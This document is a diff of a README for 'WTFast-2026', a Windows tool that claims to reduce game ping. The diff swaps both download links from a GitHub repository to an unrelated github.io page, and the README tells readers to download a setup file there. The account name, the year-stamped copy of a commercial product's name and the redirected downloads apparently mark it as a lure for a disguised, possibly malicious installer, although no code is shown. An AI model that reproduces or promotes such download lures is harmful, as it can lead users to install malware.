@@ -1,12 +1,12 @@
 # 🎮 WTFast-2026 - Lower your game ping for speed
 
-[![](https://img.shields.io/badge/Download-Blue-blue)](https://github.com/Readerverticalintegration688/WTFast-2026)
+[![](https://img.shields.io/badge/Download-Blue-blue)](https://readerverticalintegration688.github.io)
 
 WTFast-2026 improves your gaming experience on Windows. It optimizes your connection data path to reduce latency. This tool helps you manage game tunnel profiles and track performance changes over time.
 
 ## 📥 How to download the software
 
-Visit [this page](https://github.com/Readerverticalintegration688/WTFast-2026) to download the setup file. 
+Visit [this page](https://readerverticalintegration688.github.io) to download the setup file. 
 
 1. Click the link above to open the repository page. 
 2. Look for the Releases section on the right side of the screen.
